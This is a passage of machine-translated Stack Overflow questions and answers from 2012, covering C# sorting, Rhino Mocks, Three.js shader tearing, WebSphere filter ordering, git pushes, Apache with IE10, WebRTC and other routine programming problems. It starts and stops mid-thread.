> 时间：2012-11-07T14:17:07.690

可以尝试使用

```
 List<Dictionary> myList 
```

这基本上保留了一对键和值。你应该能够很容易地排序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T13:56:07.320

您可能想要创建一个如下所示的对象：

```
public class Player  
{  
    string name;  
    long score; // i assume no decimal points  
    // getters/setters
} 
```

然后像这样排序：

```
List<Player> players = new List<Player>();  
players.Sort(delegate(Player player1, Player player2) { return player1.score.CompareTo(player2.score); }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T13:57:00.370

您需要在项目中使用静态类。这个概念是，写一个类并在里面清除一个数组，我想给你看一个示例：

```
class score

{
    public static int max = 0;
    public static int john = 0;

} 
```

现在，您可以从项目中的任何位置更改值，并提供给类。您可以创建一个包含您的用户名的数组。

现在，是时候制作您的新表单，并绘制标签和按钮了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-07T14:10:54.343

```
var scores = File.ReadLines("scores.txt")
    .Select(line => {
            string[] parts = line.Split(',');
            return new { Name = parts[0], Score = int.Parse(parts[1]) };
        })
    .OrderByDescending(highScore => highScore.Score); 
```

# rhino-mocks - rhino mocks，存根的返回值应该取决于输入

> ID：13271193
> 
> 赞同：4
> 
> 时间：2012-11-07T13:52:58.637
> 
> 标签：rhino-mocks

我正在寻找一种让存根的返回值取决于其输入的干净方法。

目前我正在使用以下方法，但效果不佳。

```
metadataLogic.Expect(x => x.GetMake(args.Vehicle1.Make)).Return(new CarMake { Id = args.Vehicle1.Make });
metadataLogic.Expect(x => x.GetMake(args.Vehicle2.Make)).Return(new CarMake { Id = args.Vehicle2.Make }); 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-24T10:04:20.810

当存根返回或存根操作应取决于参数时，您可以[在 github 上使用](https://github.com/ayende/rhino-mocks/blob/master/Rhino.Mocks.GettingStarted/Documentation/09-RhinoMocksTheDoHandler/09-RhinoMocksTheDoHandler/RhinoMocksTheDoHandlerTest.cs)*Do handler few examples*

关于你的例子。
我的假设是：
有一些类`CarMake`和接口`IMetadataLogic`，如下所示：

```
class CarMake
{
    public string Id { get; set; }
}

interface IMetadataLogic
{
    CarMake GetMake(string id);
} 
```

并且`metadataLogic`是

```
var metadataLogic = MockRepository.GenerateStub<IMetadataLogic>(); 
```

如果您只需要设置一个返回`CarMake`指定实例的存根，`Id`那么您可以执行以下操作：

```
metadataLogic
   .Stub(x => x.GetMake(Arg<string>.Is.Anything))
   .Do((Func<string, CarMake>)(id => new CarMake { Id = id })); 
```

不幸的是，需要显式转换 lambda 表达式来委托。

请注意，我的示例中的存根适用于任何参数，但您的示例中的存根仅适用于`args.Vehicle1.Make`和 for `args.Vehicle2.Make`。

PS
如果您只需要设置存根，则不需要使用`Expect()`方法。你可以`Stub()`改用。

# javascript - Threejs 自定义着色器 - 屏幕撕裂

> ID：13271205
> 
> 赞同：2
> 
> 时间：2012-11-07T13:53:46.417
> 
> 标签：javascript, shader, webgl, three.js, textures

因此，要使用 Threejs 和 Brandon Jone 的 tilemap 方法（[在此处找到](http://blog.tojicode.com/2012/08/more-gpu-tile-map-demos-zelda.html)）实现 tilemap，我`THREE.Plane`为每一层使用几何图形，并使用以下自定义着色器绘制面部：

顶点着色器：

```
var tilemapVS = [
    "varying vec2 pixelCoord;",
    "varying vec2 texCoord;",

    "uniform vec2 mapSize;",
    "uniform vec2 inverseTileTextureSize;",
    "uniform float inverseTileSize;",

    "void main(void) {",
    "    pixelCoord = (uv * mapSize);",
    "    texCoord = pixelCoord * inverseTileTextureSize * inverseTileSize;",
    "    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);",
    "}"
].join("\n"); 
```

片段着色器：

```
var tilemapFS = [
    "varying vec2 pixelCoord;",
    "varying vec2 texCoord;",

    "uniform sampler2D tiles;",
    "uniform sampler2D sprites;",

    "uniform vec2 inverseTileTextureSize;",
    "uniform vec2 inverseSpriteTextureSize;",
    "uniform float tileSize;",
    "uniform int repeatTiles;",

    "void main(void) {",
    "    vec4 tile = texture2D(tiles, texCoord);", //load this pixel of the tilemap
    "    if(tile.x == 1.0 && tile.y == 1.0) { discard; }", //discard if R is 255 and G is 255
    "    vec2 spriteOffset = floor(tile.xy * 256.0) * tileSize;", //generate the offset in the tileset this pixel represents
    "    vec2 spriteCoord = mod(pixelCoord, tileSize);",
    "    vec4 texture = texture2D(sprites, (spriteOffset + spriteCoord) * inverseSpriteTextureSize);",
    "    gl_FragColor = texture;",
    "}"
].join("\n"); 
```

每个纹理的设置如下：

```
//Setup Tilemap
this.tilemap.magFilter = THREE.NearestFilter;
this.tilemap.minFilter = THREE.NearestMipMapNearestFilter;
//tilemap.flipY = false;
if(this.repeat) {
    this.tilemap.wrapS = this.tilemap.wrapT = THREE.RepeatWrapping;
} else {
    this.tilemap.wrapS = this.tilemap.wrapT = THREE.ClampToEdgeWrapping;
}

//Setup Tileset
this.tileset.wrapS = this.tileset.wrapT = THREE.ClampToEdgeWrapping;
this.tileset.flipY = false;
if(this.filtered) {
    this.tileset.magFilter = THREE.LinearFilter;
    this.tileset.minFilter = THREE.LinearMipMapLinearFilter;
} else {
    this.tileset.magFilter = THREE.NearestFilter;
    this.tileset.minFilter = THREE.NearestMipMapNearestFilter;
} 
```

制服是：

```
//setup shader uniforms
this._uniforms = {
    mapSize: { type: 'v2', value: new THREE.Vector2(this.tilemap.image.width * this.tileSize, this.tilemap.image.height * this.tileSize) },
    inverseSpriteTextureSize: { type: 'v2', value: new THREE.Vector2(1/this.tileset.image.width, 1/this.tileset.image.height) },
    tileSize: { type: 'f', value: this.tileSize },
    inverseTileSize: { type: 'f', value: 1/this.tileSize },

    tiles: { type: 't', value: this.tilemap },
    sprites: { type: 't', value: this.tileset },

    inverseTileTextureSize: { type: 'v2', value: new THREE.Vector2(1/this.tilemap.image.width, 1/this.tilemap.image.height) },
    repeatTiles: { type: 'i', value: this.repeat ? 1 : 0 }
}; 
```

以及实际的几何和网格：

```
//create the shader material
this._material = new THREE.ShaderMaterial({
    uniforms: this._uniforms,
    vertexShader: tilemapVS,
    fragmentShader: tilemapFS,
    transparent: false
});

this._plane = new THREE.PlaneGeometry(
    this.tilemap.image.width * this.tileSize * this.tileScale,
    this.tilemap.image.height * this.tileSize * this.tileScale
);

this._mesh = new THREE.Mesh(this._plane, this._material);
this._mesh.z = this.zIndex; 
```

`this.tileSize`是`16`和`this.tileScale`是`4`。我遇到的问题是，在 16x16 瓷砖的边缘周围，我有些撕裂：

![屏幕撕裂](../Images/09ee79d4235b3bc6a5b8f91a19100350.png)

奇怪的是它不会一直发生，只是在沿 y 轴移动时偶尔发生（但是在我的 linux 机器上，问题要严重得多，并且也会影响 x 轴）。

当与我的顶点着色器一起放置时，这几乎就像 16x16 瓷砖有少量脱落；但我不确定是什么原因造成的。任何帮助表示赞赏，谢谢！

**编辑**

这是撕裂的更好图像，在草地上更明显：

![屏幕撕裂2](../Images/0c43519a9de3691d3a139ca6c7b11d67.png)

如您所见，它位于 16x16 瓷砖边缘（因为它们按 缩放`4`）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-19T05:49:50.577

您正在使用 mipmapped 纹理，并且您的纹理坐标在图块边缘是不连续的：

```
"    vec2 spriteOffset = floor(tile.xy * 256.0) * tileSize;", //generate the offset in the tileset this pixel represents
"    vec2 spriteCoord = mod(pixelCoord, tileSize);",
"    vec4 texture = texture2D(sprites, (spriteOffset + spriteCoord) * inverseSpriteTextureSize);", 
```

floor 和 mod 函数意味着纹理坐标突然在两个像素之间跳跃（如您所愿，以获得不同的图块）。

但是，纹理查找使用像素之间的坐标变化来确定要使用的 mipmap 级别，因此在图块边缘它会跳到使用小得多的 mipmap，并且存在不连续性，因为这是与其余像素不同的 mipmap。

最快的方法是不使用 mipmap，例如：

```
texture.minFilter = THREE.LinearFilter;
texture.minFilter = THREE.NearestFilter; 
```

否则，如果您需要 mipmap，则需要将第三个参数 bias 传递给 texture2D。通常将此设置为 0.0，然后当您位于标题边缘时，将其设置为您要遍历的 mipmap 数量的负数以抵消这种影响。

例如，-11.0 将带您从最低的单像素 mipmap 到 0 个 2048x2048 的全尺寸纹理的 11 个 mipmap。确切的值需要根据缩放图像大小纹理大小等进行一些计算。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T16:05:13.837

我怀疑您遇到这些问题是由于相机位置导致精灵 uv 映射错误。基本上，您在应该渲染的精灵上显示精灵表中的相邻精灵。

特别是这一行：`vec2 spriteOffset = floor(tile.xy * 256.0) * tileSize;"

似乎它可能导致偏移问题。你可以通过用明亮的颜色填充你的精灵来做一个更好的检查，看看它是否会弹出。

# expressionengine - Matrix & Playa 调用减慢我的网站速度

> ID：13271206
> 
> 赞同：2
> 
> 时间：2012-11-07T13:53:46.680
> 
> 标签：expressionengine

我正在运行一个带有 1 个频道的模板来显示大约 500 个条目。这些条目由几个文本字段和一个 MX 谷歌地图字段组成。

该页面需要 4 秒才能加载（这太长了），当我查看输出分析器时，我注意到有几百行是这样的：

> (0.545310 / 45.39MB) 调用扩展类/方法：Matrix_ext/channel_entries_tagdata (0.552964 / 45.42MB) 调用扩展类/方法：Playa_ext/channel_entries_tagdata (0.553339 / 45.42MB) 调用扩展类/方法：Matrix_ext/channel_entries_tagdata (0.561014 / 45.455) ) 调用扩展类/方法：Playa_ext/channel_entries_tagdata (0.561453 / 45.45MB) 调用扩展类/方法：Matrix_ext/channel_entries_tagdata (0.570236 / 45.49MB) 调用扩展类/方法：Playa_ext/channel_entries_tagdata (0.570871 / 45.49MB) 调用扩展类/方法：Matrix_ext/channel_entries_tagdata (0.581254 / 45.52MB) 调用扩展类/方法：Playa_ext/channel_entries_tagdata ...

奇怪，因为该通道中没有 playa 或矩阵字段。我在 P&T 支持论坛上询问过，但也许你们能提供帮助？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-07T14:57:09.793

我认为解决这种情况的一个好方法可能是使用查询模块。返回这么多结果的 Channel Entries 标记将对查询造成很大的负担。您可以使用 Channel Entries 标签的 disable= 参数显着减少数量，尽可能禁用，但有时使用查询模块编写自定义 SQL 查询效率更高。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:36:21.147

卸载 Matrix 和 Playa**扩展**（确保保留字段类型和模块）可以解决这个问题。

对 Matrix & Playa 的调用现在消失了，页面加载正常。其他所有内容（包括 Matrix 和 Playa 字段）仍然有效。

# android - Android 模拟器设置中没有“GPU 模拟”选项

> ID：13271211
> 
> 赞同：2
> 
> 时间：2012-11-07T13:53:59.087
> 
> 标签：android, android-emulator

我正在尝试在 Android 模拟器中启用 GPU 加速，但 AVD 设置中没有`GPU emulation`选项。

![在此处输入图像描述](../Images/a5613a014a67fb880a3e270ba9bbafab.png)

我的配置：Win8 @ AMD Phenom II + Eclipse Juno + 最新的 Android SDK 20.0.3

我错过了什么吗？AMD平台或Win8不支持GPU加速吗？这是[korri 博客](http://www.korri.net/blog/2012/4/12-how-to-enable-gpu-acceleration-in-android-emulator.html)的截图：

![在此处输入图像描述](../Images/306051a7720b34d4201d7893693de643.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T13:57:24.253

在创建 AVD 时.. 在您的硬件中转到新建并选择您想要的功能...参考这张图片![在此处输入图像描述](../Images/fa91745b5e41627cc13b5c107e9b6cae.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-24T04:57:26.123

在 Eclipse 4.21 中，可以在给定选项中启用 GPU，如屏幕截图所示

*   转到 AVD 管理器
*   单击创建/编辑选项

他们你可以看到启用 GPU 的选项

[![在此处输入图像描述](../Images/084bc99f8280f72e281c0c7b54c6037f.png)](https://i.stack.imgur.com/XJ05G.png)[![ ]](https://i.stack.imgur.com/RZsMR.png) [2](https://i.stack.imgur.com/RZsMR.png)

# html - 表格侧边栏向下移动

> ID：13271213
> 
> 赞同：1
> 
> 时间：2012-11-07T13:54:20.757
> 
> 标签：html, css, html-table

我正在一个网站上工作，该网站是在表格中构建的，因为我对 CSS 还不是很好。得到这个表结构：

```
<table>
  <tr>
    <td>Siderbar 1</td>
    <td>Main Part</td>
    <td>Sidebar 2</td>
  </tr>
</table> 
```

我的问题是，一旦我的“主要部分”向下扩展，侧边栏就会随之向下移动，总是试图在中间。

有没有办法让他们保持领先？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T13:58:35.780

**不要使用表格进行布局**

表格仅用于表格数据。比使用更好的解决方案是使用元素和 CSS 样式`valign`创建布局。`div`

阅读以下文章，了解不使用表格进行现代网页设计的原因（即 1995 年后）：

[http://webdesign.about.com/od/layout/a/aa111102a.htm](http://webdesign.about.com/od/layout/a/aa111102a.htm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T13:55:45.283

用于`<td valign="top">`使您的侧边栏始终位于顶部

```
<table>
  <tr>
    <td valign="top">Siderbar 1</td>
    <td>Main Part</td>
    <td valign="top">Sidebar 2</td>
  </tr>
</table> 
```

如果您的侧边栏内容可以超过主要部分，那么您也可以添加 `<td valign="top">`到主要部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T15:21:58.960

首先，用表格设计布局是一种不好的做法。请阅读简短的指定链接。通常，该行中的内容`<td>`是中间对齐的，如果该行中的一个单元格具有更多内容，则该行中的所有其他单元格将自动展开。所以在布局中会显示不必要的空白。valign 属性已弃用，因此如果您希望内容位于顶部，请使用 CSS 属性

```
vertical-align:top 
```

# php - 将数据从 php 脚本传递到 html 表单

> ID：13271215
> 
> 赞同：1
> 
> 时间：2012-11-07T13:54:24.620
> 
> 标签：php, html, json, forms

我有一个 iphone 应用程序。用户可以填写表格。然后将表单的数据传递给 php 脚本。我在那里解析。

现在，问题是：

是否可以将数据从 php 脚本传递到 html 表单（这次是在网站上）？

IE

Json 从手机发送到 php scipt：

```
{
  "Email":"klklkkl",
  "DueDate":"1454"
} 
```

php解析上述Json。

现在网站上有同样的表格。我想将上述数据传递给其中包含的两个输入框。这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:04:09.337

您需要使用 JavaScript 在客户端处理此信息。通过 XML 进行通信的服务器与客户端 JavaScript 脚本的组合通常称为 AJAX。或者：异步 JavaScript 和 XML。

但是，我建议您使用 JSON 而不是 XML，因为如果使用正确，您可以用更少的字符（字节）发送相同的信息。

# pdf-generation - NopCommerce v2.65 更改发票 pdf

> ID：13271222
> 
> 赞同：1
> 
> 时间：2012-11-07T13:54:38.200
> 
> 标签：pdf-generation, nopcommerce

我正在使用 nopcommre 2.65 版，我的问题很简单；有没有一种简单的方法来更改自动生成的发票 pdf？我必须添加一些东西，我现在唯一的方法是将它们全部放在您可以上传到发票的徽标中。

有任何想法吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:46:21.093

在 Nop-Commerce 2.65 中，发票 pdf 是使用**iTextSharp** libaery 生成的，如果您想更改发票格式，那么您需要修改编写的 iTextSharp 代码

```
PDFServer.cs in (Nop.Services.Common) **PrintOrdersToPdf** methods. 
```

我认为这是唯一的方法，如果你想在 NOP2.65 中将 PDF 更改为哑光，有关使用 iTextSharp 进行设计的更多详细信息，请参阅[http://www.mikesdotnetting.com/Article/86/iTextSharp-Introducing-Tables](http://www.mikesdotnetting.com/Article/86/iTextSharp-Introducing-Tables)

# macos - mac的excel下拉列表失败

> ID：13271225
> 
> 赞同：0
> 
> 时间：2012-11-07T13:54:55.117
> 
> 标签：macos, excel, drop-down-menu

我曾经`Data Validation`在 Excel 中创建一个下拉列表。在数据选项卡上选择后`list`，我将*源*值设置为`1,2,3`. 它在 Microsoft Windows 的 Excel 中工作，但在 Apple MacBook Air 的 Excel 中失败。在 MacBook Air 中，该列表只有一项“1,2,3”。在 MacBook Air 中创建下拉列表有什么不同吗？

对了，还有一个问题：如何让下拉列表的箭头始终可见？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:13:00.553

本地化设置可以具有用于分隔多个参数的不同元素。

因此，在您的 Windows 系统上，这可能是逗号，而在您的 Mac 上，这可能是分号。

请注意，在安装/首次使用时程序选择默认值后，用户可以更改此设置

# android - 如何在 Unity 中制作适用于 Android 的 LiveWallaper？

> ID：13271227
> 
> 赞同：3
> 
> 时间：2012-11-07T13:54:55.033
> 
> 标签：android, unity3d

想问一下是否有人知道如何在unity 4中为android制作动态壁纸的教程？

我能找到的唯一教程就是这个 - [https://www.youtube.com/watch?v=l0Ou4_xA_Cg](https://www.youtube.com/watch?v=l0Ou4_xA_Cg)

但它看起来需要一个单独的插件，仅适用于 unity 3.4

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-01-14T05:24:41.913

我最近发布了 uLiveWallpaper - 一个 Unity 资产，可以使用 Unity 5 为 Android 创建动态壁纸。它经过充分测试且可靠，可为 Android Studio 创建项目，并提供占位符代码以帮助您入门。

一探究竟！

[http://forum.unity3d.com/threads/ulivewallpaper-develop-android-live-wallpapers-with-unity-5.375255/](http://forum.unity3d.com/threads/ulivewallpaper-develop-android-live-wallpapers-with-unity-5.375255/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T03:26:04.763

官方不支持 Unity 的 LiveWallpapers。

我想最好的选择是从以下位置获得 unity 3.4：

[http://unity3d.com/unity/download/archive](http://unity3d.com/unity/download/archive)

并由教程中的 AJUnity2Eclipse 制作（AJUnity2Eclipse 在 Unity AssestStore 上可用 - 25 美元）。

# java - 在 j_security_check 之前执行的过滤器

> ID：13271231
> 
> 赞同：1
> 
> 时间：2012-11-07T13:55:11.627
> 
> 标签：java, security, jakarta-ee, websphere

我有一个映射到 /* 的过滤器，我的安全约束映射到 /*。

当应用程序未配置（数据库中的条目）时，过滤器执行请求转发。

当我访问应用程序时，我希望看到 j_securit_check 提供的登录页面，但执行过滤器并执行转发。这以循环结束，因为我从未进入登录页面。

*我认为在处理过滤器之前*执行了安全检查？

这是 WebSphere 8.0.0.4。它在 Tomcat 和 JBoss 下运行良好。

谢谢阅读。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:10:18.933

根据我的理解，由于安全原因，您应该无法拦截 j_security_check 调用。

听起来像是 Webspehere 中的一个错误（我用谷歌搜索了它，这是旧版本 Websphere 中的一个错误/功能，不确定 8.0.0.4）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:59:39.147

您不能，但是您可以在 j_security_check 上映射过滤器以进行身份​​验证后处理，或者您可以编写自己的自定义登录模块或信任关联拦截器，请参见此处的示例：http: [//www.ibm.com/developerworks/websphere/techjournal/ 1112_deluca/1112_deluca.html](http://www.ibm.com/developerworks/websphere/techjournal/1112_deluca/1112_deluca.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T20:26:31.073

如果我将安全约束映射到 /*，然后将过滤器映射到 /（没有通配符），一切都会按预期工作。

这是我从 IBM 得到的关于为什么它在运行安全检查*之前运行 servlet 过滤器的回复。*

> 安全 L3 与 Webcontainer 团队的开发人员进行了交谈。他说首先运行servlet过滤器是WAD。j_security_check 是一个 Web 资源，与所有 Web 资源请求一样，servlet 过滤器将首先运行。这就是您所关心的问题的简短回答。安全 L3 查看请求流。似乎过滤器的编码方式，login.jsp 结果永远不会返回给客户端，因此从来没有做过 j_security_check。可以看到过滤器做了一个"request.getRequestDispatcher("test/test-page.jsp").forward(request, response);"。开发人员说 forward() 请求没有经过身份验证检查，再次是 WAD。因此，在重新设计 servlet 过滤器时，请在 minf 中保留以下内容。
> 
> *   1 Servlet 过滤器将在 j_security_check 或任何 web 资源之前调用。
> *   2 使用 request.getRequestDispatcher().forward() 禁用身份验证检查。

我不会重新设计我的过滤器，因为它在 Tomcat 或 JBoss 下运行时按预期工作。唯一需要更改的是 web.xml 中的映射。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-21T08:20:53.203

这是 IBM 的另一个回应。他们建议来自过滤器的转发永远不会受到 j_security_check 的保护，因此在使用 WebSphere 时要小心。Jboss 和 Tomcat 的行为并非如此。

## 我也让 Webcontainer 开发人员查看了这个，并收到了以下更新：

web.xml 显示 [configFilter] 映射到 /* 即 configFilter /*

并且安全性也映射到所有，即通用身份验证。/*

入站请求是针对 [/rootFilter/test/test-page.jsp]，调用安全性，然后重定向到 [rootFilter/login.jsp]。现在对于请求 [rootFilter/login.jsp]，由于过滤器 [configFilter]] 映射到所有请求，因此执行 [configFilter] 将请求转发到 [/rootFilter/test/test-page.jsp] 然后进行测试-page.jsp 已提供。

根据 13.2 声明性安全性中的 Java Servlet 规范，安全性对于任何分派的请求都无效，因此转发到 [/rootFilter/test/test-page.jsp] 的请求不会检查安全性。

这里来自规范，安全模型适用于 Web 应用程序的静态内容部分以及客户端请求的应用程序中的 servlet 和过滤器。当 servlet 使用 RequestDispatcher 调用静态资源或使用转发或包含的 servlet 时，安全模型不适用。

客户需要查看应用程序的设计，以确保过滤器未映射到所有请求或过滤器未转发到其他资源。

# git - 在有人推入之后，更新 git 存储库的正确方法是什么？

> ID：13271232
> 
> 赞同：0
> 
> 时间：2012-11-07T13:55:21.087
> 
> 标签：git

例如，如果我通过 ssh将存储库克隆`A`到其他远程位置 ( )，在 中编辑，提交，然后执行`B``B`

```
git push A 
```

当我回到 时`A`，我看到它现在是最新推送的修订版，但它也有一些变化 -`B`实际上与 中的提交直接相反。我通常通过使用来解决它

```
git checkout -f master 
```

但是“-f”标志让我感到紧张——例如，可能会有一些有用的更改上演，我在执行此结帐时不小心丢弃了这些更改。

我究竟做错了什么？有没有更好的推送/更新方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T15:17:18.910

我认为根本问题是您正在`git push`访问一个具有签出工作副本的非裸存储库。我很惊讶`git`并没有为此抱怨，但也许你有一个旧版本`git`或者你已经配置它不抱怨。`git push`将更新远程存储库，但不会更新远程工作副本，因此当您再查看时`A`，工作副本内容对应于以前的某个修订，而存储库已更新。显然，两者之间存在差异。在这种情况下`git checkout -f`，可能是您最好的选择（或`git reset --hard HEAD`），然后将您的`A`存储库转换为裸存储库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:06:57.063

预期的命令将是“git pull”而不是“git checkout”

如果您有未提交的更改，您应该这样做。这将保存您所做的更改并获得新的更新。最后重新应用您最初保存的更改。

```
git stash
git pull
git stash pop 
```

如果您有尚未推送的本地提交，您可以这样做。这将回退您的更改，应用推送的内容并重新应用提交。

```
git pull --rebase 
```

您可以只对提交执行“git pull”，但这会添加一个合并提交，在我看来这会弄脏历史并可能导致一些问题。

由于您所说的原因，我通常不喜欢 -force 选项。你不想失去任何有用的东西。

# apache - Internet Explorer 10 (Windows 8) 使 Apache 崩溃

> ID：13271234
> 
> 赞同：7
> 
> 时间：2012-11-07T13:55:23.667
> 
> 标签：apache, windows-8, internet-explorer-10

我刚刚安装了 Windows 8，我很难在上面运行 Apache。

在对 httpd.conf 文件进行了几次调整之后（由于 WWAHost.exe 更改了端口，并且由于 IPv6 允许 ::1）我终于让它运行了（安装了 EasyPHP），但是当我在 Internet Explorer 10 上打开一些本地站点时， Apache 停止响应并继续尝试永远加载页面。

我认为这与 Internet Explorer 10 有关，因为在 Internet Explorer 上加载任何本地站点之前，在其他浏览器上工作正常。之后，我必须重新启动 Apache 才能再次工作，并且不再使用 Internet Explorer 10 以保持其运行。

你有同样的问题吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-10-15T18:35:22.957

我有一个类似的问题，并设法用以下解决方案解决它。请参阅*[请求 EasyPHP/Apache 托管页面时 IE 冻结](http://astutelogic.com/ie-freezes-easyphp-apache/)*。

由于我已经有一个现代 Apache，我只是添加了：

```
AcceptFilter https none
AcceptFilter http none
EnableSendfile Off
EnableMMAP off 
```

在加载模块部分之前。这就像一个魅力。

我的配置是：Apache 2.4.4 和 Internet Explorer 10

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-19T16:47:33.450

我在 Windows 7 上使用 Internet Explorer 10 运行 Apache 2.4.2 (EasyPHP 12) 时遇到了同样的问题，尽管我认为我[在 astutelogic.com 上](http://astutelogic.com/ie-freezes-easyphp-apache/)找到了一个似乎可行的解决方案......至少，将 Apache 升级到 2.4.4使用这些说明对我有用。

我从 Apache Lounge 下载了 Apache 二进制文件，然后在提取/重命名步骤之后，我将当前的 'php.ini' 和 'httpd.conf' 文件复制到新文件夹中，并将附加行添加到我的 'httpd.conf'按照说明归档。

根据链接页面，关于开发服务器与实时服务器的注释：

> 据我所知，AcceptFilter 指令仅在 FreeBSD 和 Linux 上真正有效（在较小程度上），因此在 Windows 上使用它们并没有任何好处。不过我可能是错的……无论如何，它只是一个开发环境，所以慢几毫秒应该不是问题。

**更新**

刚刚注意到 EasyPHP 13.1 已经发布，它与 Apache 2.4.4 一起发布。如果您还没有尝试过我上面链接的步骤（或者只是更新了 EasyPHP），我建议您下载更新后的堆栈。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-22T16:22:43.690

我一直试图在 Windows 7 上的 Internet Explorer 10 上解决相同的问题，并发现使用兼容模式可以缓解大多数使用`localhost`站点的延迟。

我知道这并不完全是一个解决方案，但我在 Windows 8 上也遇到了这些问题，并尝试了常见的修复方法，但无济于事。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-15T02:42:43.830

它可能与 ThreadsPerChild 有关。

检查`error.log`和`httpf.conf`：

```
# Server-pool management (MPM specific)
#Include conf/extra/httpd-mpm.conf 
```

我在 Internet Explorer 10 中遇到了同样的问题，但现在我似乎无法重现它。通常我使用Firefox，没有问题。更新到 Apache 2.4 后，我似乎遇到了这个问题。

# javascript - 使用 WebRTC 对等传输通用数据/对象？

> ID：13271237
> 
> 赞同：1
> 
> 时间：2012-11-07T13:55:35.840
> 
> 标签：javascript, html, webrtc, real-time-data

我只是想找到任何演示或任何类型的说明，以便能够使用 WebRTC 传输通用数据，例如 JSON。

我遇到的任何[演示/文章似乎都只处理我觉得奇怪的视频传输，有点像在能够走路之前跑步。](http://www.html5rocks.com/en/tutorials/webrtc/basics/)

看起来这是将用于此任务[的 api 。](http://dev.w3.org/2011/webrtc/editor/webrtc.html#peer-to-peer-data-api)有谁知道如何实现这一点，或者知道任何地方的演示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T15:10:00.947

我还没有尝试过，但是有这个[Firefox 演示](https://hacks.mozilla.org/2012/11/progress-update-on-webrtc-for-firefox-on-desktop/)

尽管没有数据通道的演示，但[WebRTC 上的这个 Google I/O 视频可能会很有趣。](https://www.youtube.com/watch?v=E8C8ouiXHHk)

另请注意，Chrome 中尚未实现数据通道（[“数据通道 API 尚未实现，标准委员会正在讨论其实现”](https://sites.google.com/site/webrtc/faq-recent-topics)），但上述演示文稿表示它们将[在本季度到期](https://docs.google.com/presentation/d/16vD-RApRli9W76z36hKe-B3jjS1R-J9qX4lpBq2JrHg/present#slide=id.g4e5bbbc_0_130)

# ruby-on-rails - 调试器自动进入implicit.rb

> ID：13271248
> 
> 赞同：0
> 
> 时间：2012-11-07T13:56:08.703
> 
> 标签：ruby-on-rails, ruby, debugging

我在我的 gemset 中安装了调试器 gem

```
<pre>
nikhil@nikhil-K54C:/media/media1/railscode/beasport$ bundle show debugger
/home/nikhil/.rvm/gems/ruby-1.9.3-p194@beasport/gems/debugger-1.2.0
</pre> 
```

我的意图是通过在我的代码中放置“调试器”调用来使用这个 gem 来调试我的应用程序，以便我可以使用它来调试应用程序。然而奇怪的是，即使我没有在我的代码中的任何地方放置“调试器”调用，但仍然每当我点击我的应用程序的任何 url（来自 localhost:3000）时，调试器都会在文件中开始调试

```
<pre>
/home/nikhil/.rvm/gems/ruby-1.9.3-p194@beasport/gems/actionpack-3.2.8/lib/action_controller/metal/implicit_render.rb
</pre> 
```

这是我做“列表”时得到的

```
<pre>

=> Ctrl-C to shutdown server
[2012-11-07 19:11:18] INFO  WEBrick 1.3.1
[2012-11-07 19:11:18] INFO  ruby 1.9.3 (2012-04-20) [i686-linux]
[2012-11-07 19:11:18] INFO  WEBrick::HTTPServer#start: pid=6602 port=3000
/home/nikhil/.rvm/gems/ruby-1.9.3-p194@beasport/gems/actionpack-3.2.8/lib/action_controller/metal/implicit_render.rb:5
default_render unless response_body
(rdb:1) list
[0, 9] in /home/nikhil/.rvm/gems/ruby-1.9.3-p194@beasport/gems/actionpack-3.2.8/lib/action_controller/metal/implicit_render.rb
   1  module ActionController
   2    module ImplicitRender
   3      def send_action(method, *args)
   4        ret = super
=> 5        default_render unless response_body
   6        ret
   7      end
   8  
   9      def default_render(*args)
(rdb:1) 
</pre> 
```

我正在使用 webrick。这令人沮丧。当我从 gemfile 中删除调试器 gem 并执行“捆绑安装”时，它工作正常，但我将无法调试我的应用程序。我再次检查了我的其他应用程序，那里的调试器工作得很好，不要不必要地去implicit.rb。请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-31T03:01:26.077

我知道这是去年发布的一个问题，您可能不再需要答案，但是由于我也遇到了同样的问题并且必须自己解决，所以我发布了对我有用的内容。

```
 gem uninstall debugger
 gem uninstall debugger-linecache
 gem uninstall debugger-ruby_core_source 
```

然后，

```
 gem install debugger 
```

# python - Django / Python使用shell（os.system / Popen）转换PDF在生产中不起作用

> ID：13271254
> 
> 赞同：4
> 
> 时间：2012-11-07T13:56:25.783
> 
> 标签：python, django, apache

我在 CLI 上使用 libreoffice 将一些文档转换为 Django 中的 PDF。

这是在我看来（并且也在模型的保存方法中尝试过）：

```
outdir = '/'.join([settings.MEDIA_ROOT, 'pdf'])
